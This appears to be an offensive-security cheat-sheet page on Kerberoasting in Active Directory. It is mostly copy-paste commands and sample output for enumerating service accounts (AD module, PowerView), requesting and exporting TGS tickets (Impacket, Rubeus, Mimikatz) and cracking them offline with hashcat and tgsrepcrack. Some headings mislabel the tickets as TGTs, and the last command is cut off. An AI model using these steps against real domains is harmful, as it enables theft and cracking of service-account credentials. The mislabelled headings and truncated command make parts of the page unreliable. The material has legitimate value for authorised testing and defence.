# Kerberoasting

The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets are** **encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**. You can know that a **user account** is being used as a **service** because the property **"ServicePrincipalName"** is **not null**.

#### Impacket Tools <a href="#impacket-tools" id="impacket-tools"></a>

```bash
impacket-GetUserSPNs evilcorp.local/aduser:Password#123 -usersfile usernames.txt -request
```

#### Rebeus <a href="#rebeus" id="rebeus"></a>

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#### AD Module <a href="#a-d-module" id="a-d-module"></a>

```powershell
PS C:\Users\Administrator\Desktop> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName


DistinguishedName    : CN=krbtgt,CN=Users,DC=evilcorp,DC=local
Enabled              : False
GivenName            :
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : ac8d4198-2f46-4293-a4b3-99cb76de1645
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-3253464773-3242635457-2311576871-502
Surname              :
UserPrincipalName    :
```

#### PowerView.ps1 <a href="#powerview.ps1" id="powerview.ps1"></a>

```powershell
PS C:\Users\Administrator\Desktop> Get-NetUser -SPN | select serviceprincipalname


logoncount                    : 0
badpasswordtime               : 1/1/1601 5:30:00 AM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=evilcorp,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-3253464773-3242635457-2311576871-502
whenchanged                   : 7/23/2023 12:16:38 PM
admincount                    : 1
codepage                      : 0
samaccounttype                : 805306368
showinadvancedviewonly        : True
accountexpires                : 9223372036854775807
cn                            : krbtgt
*** 
```

#### Request a TGT In Memory: <a href="#request-a-tgt-in-memory" id="request-a-tgt-in-memory"></a>

```powershell
#Using Powershell:
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp mgmt.dollarcorp.moneycorp.local"

#Using PowerView.ps1:
Request-SPNTicket

#Check if the TGS has been granted:
klist


#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Cracking TGT-Rep <a href="#cracking-tgt-rep" id="cracking-tgt-rep"></a>

```bash
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


#Crack the Service account password using kerbroat modules:
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
40a10000-student1@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.localDOLLARCORP.MONEYCORP.LOCAL.kirbi
```

### Clock-skew <a href="#clock-skew" id="clock-skew"></a>

```powershell
faketime "$(ntpdate -q dc1.ad.lab | cut -d ' ' -f 1,2)" bloodhound-python -c All -u joan.hesther -p
```
